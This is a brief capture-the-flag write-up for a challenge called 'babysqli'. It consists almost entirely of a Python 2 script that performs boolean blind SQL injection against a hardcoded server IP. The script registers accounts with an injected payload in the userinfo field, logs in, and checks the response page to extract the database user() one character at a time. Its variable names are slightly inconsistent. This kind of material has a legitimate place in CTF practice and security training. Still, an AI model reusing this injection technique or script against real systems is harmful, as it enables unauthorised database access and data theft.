>babysqli wp

#u can use `innodb`:)

```python
# -*- coding:utf-8 -*- 
import requests
from random import Random
def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str
dic='0123456789_@:.abcdefghijklmnopqrstuvwxyz'
url="http://47.98.51.5/vlogin/reg.php"
table_name=''
def register(email,uinfo):
	url="http://47.98.51.5/vlogin/reg.php"
	data={
	"email":email,
	"pass":"123",
	"userinfo":userinfo
	}
	requests.post(url=url,data=data)
def login(loginuser):
	url="http://47.98.51.5/vlogin/login.php"
	a=requests.session()
	data2={
	"loginuser":loginuser,
	"loginpass":"123"
	}
	a.post(url=url,data=data2)
	url3="http://47.98.51.5/vlogin/vpage/index.php"
	b=a.get(url3)
	return b.text
for i in range(1,100):
	for j in dic:
		email=random_str(randomlength=8)+"@1.com"
		userinfo="'or(if(1,(select(substr((select(user())),{},1))='{}'),1)=1)#".format(i,j)
		register(email,userinfo)
		c=login(email)
		if "1.png" in c:
			table_name += j
			print table_name
			break
print table_name
```
